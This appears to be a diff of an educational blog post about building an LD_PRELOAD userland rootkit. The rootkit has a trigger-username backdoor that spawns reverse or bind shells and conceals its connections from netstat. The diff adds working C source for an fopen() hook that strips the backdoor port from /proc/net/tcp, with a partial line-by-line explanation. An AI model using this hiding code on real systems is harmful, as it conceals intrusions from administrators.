@@ -21,7 +21,7 @@ I came across LD_PRELOAD rootkits while watching [a talk by @r00tkillah](https:/
 
 My goal for this assignment since we had just learned how to hook syscalls in the previous assignment, was to create a userland rootkit which:
 - provided a backdoor/command-shell opportunity,
-- hid malicious network connections from `netstat` and `lsof`, and
+- hid malicious network connections from `netstat` (and maybe `lsof`), and
 - hid malicious files. 
 
 **To be clear:** I'm fully aware this isn't a robust, red-team-ready rootkit ready to use for engagements. These techniques have been analyzed and discussed for around 7 years now. **BUT** it is sort of a niche subject and something I don't think many people have come across. I would also like to just point people towards blogs and posts that detail the technical details at play here instead of expounding on those details myself, as I am not an expert. 
@@ -318,10 +318,10 @@ The IPv6 reverse shell function works very similarly.
 
 We have hooked all `write()` calls system wide and have isolated `syslog` writing to the `/var/log/auth.log` file to log failed SSH attempts. We use a trigger word as our username, which tells the hooked command to either spawn a bind or reverse shell over either IPv4 or IPv6. We have a lot of options for our backdoor now. 
 
-## Hiding From `netstat`
+## Hiding From `netstat` (and `lsof` ??)
 Now that we have a functioning backdoor, it's time to hide those connections from `netstat`. We've picked a high port for our shell functions so that the host is always using local port `65065` for our connections. This is a pretty random port to use so we will avoid a lot of false positives hopefully. 
 
-To understand how to hide from these utilities, we first have to understand what syscalls they're making when they're run. Let's open up a listener on `65065` and run `netstat` and `lsof` with `strace` to see what's going on under the hood. We'll do `netstat` first:
+To understand how to hide from these utilities, we first have to understand what syscalls they're making when they're run. Let's open up a listener on `65065` and run `netstat` with `strace` to see what's going on under the hood:
 ```tokyo:~/LearningC/ # strace netstat -ano | grep -v unix                                                                     
 execve("/usr/bin/netstat", ["netstat", "-ano"], 0xbfd0de64 /* 47 vars */) = 0
 -----snip-----
@@ -352,11 +352,56 @@ tokyo:~/LearningC/ # cat /proc/net/tcp
 
 So we see the same information that was printed to the terminal in hex representation. `FE29` is `65065` in hex and since we're listening on the local `0.0.0.0` interface, it's prepended by `00000000`. There is no remote address information because we're not connected. 
 
-So `netstat` reads this file and then stores that in a read buffer which is then interpreted and written to the terminal. Let's look at `lsof` now:
+So `netstat` reads this file and then stores that in a read buffer which is then interpreted and written to the terminal. 
+
+We need a way to intercept a portion of this process and alter the results so that the `FE29` entries are not passed back to the end user of `netstat`. To accomplish this, I created an `fopen()` hook which is a higher-level wrapper function and not quite a syscall like `open()`. `netstat` actually calls `fopen()` which in turn calls lower level functions and syscalls. Here is the entire hook, and we will explain the whole thing: 
+```c
+FILE *(*orig_fopen)(const char *pathname, const char *mode);
+FILE *fopen(const char *pathname, const char *mode)
+{
+	orig_fopen = dlsym(RTLD_NEXT, "fopen");
+
+	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
+
+	FILE *fp;
+
+	if (ptr_tcp != NULL)
+	{
+		char line[256];
+		FILE *temp = tmpfile();
+		fp = orig_fopen(pathname, mode);
+		while (fgets(line, sizeof(line), fp))
+		{
+			char *listener = strstr(line, KEY_PORT);
+			if (listener != NULL)
+			{
+				continue;
+			}
+			else
+			{
+				fputs(line, temp);
+			}
+		}
+		return temp;
+
+	}
+
+	fp = orig_fopen(pathname, mode);
+	return fp;
+}
 ```
-tokyo:~/LearningC/ # strace lsof -i :65065                                                                                 
-execve("/usr/bin/lsof", ["lsof", "-i", ":65065"], 0xbfe2b318 /* 47 vars */) = 0
------snip-----
+
+Let's explain this line by line:
++ `FILE *(*orig_fopen)(const char *pathname, const char *mode);` we are declaring a pointer to the function `orig_fopen` which has the exact definition of the legitimate `fopen()` function. This will later become our reference to the real function;
++ `FILE *fopen(const char *pathname, const char *mode)` this is our hook, this is what the calling program sees and recognizes as the offical definition of `fopen()`;
++ `orig_fopen = dlsym(RTLD_NEXT, "fopen");` we are initializing the pointer we declared earlier. We now have the address of the real `fopen()` function so that we can pass execution to it when needed;
++ `char *ptr_tcp = strstr(pathname, "/proc/net/tcp");` we are declaring a pointer that will be initialized if the `pathname` passed as an argument to `fopen()` by the calling program has a substring match with `"/proc/net/tcp"`; 
++ `FILE *fp;` we are using the `FILE` keyword to declare a pointer named `fp` that is of the `FILE` structure type. This will be normally the type of returned variable type of an `fopen()` function call so we need to initialize this with a `fopen()` call later;
++ `if (ptr_tcp != NULL)` if there's a match, and the file being opened is our `/proc/net/tcp`, do something;
++ `char line[256];` we are declaring a character array of 255 bytes and a null terminator;
++ `FILE *temp = tmpfile();` we are declaring AND initializing another `FILE` pointer, this one named `temp`, which points to a temporary file that lives in `/tmp` as long as `netstat` is running;
++ 
+
 
 
 
